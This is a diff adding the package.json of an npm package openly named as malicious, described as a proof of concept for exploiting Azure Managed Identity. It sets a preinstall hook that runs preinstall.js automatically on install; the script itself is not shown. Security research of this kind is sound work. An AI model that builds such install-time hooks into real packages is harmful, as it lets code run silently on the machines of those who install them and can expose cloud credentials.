@@ -1,0 +1,11 @@
+{
+  "name": "mypocmaliciouspackage",
+  "version": "1.0.0",
+  "description": "Proof of Concept for exploiting Azure Managed Identity",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node preinstall.js"
+  },
+  "author": "SecurityResearcher",
+  "license": "ISC"
+}
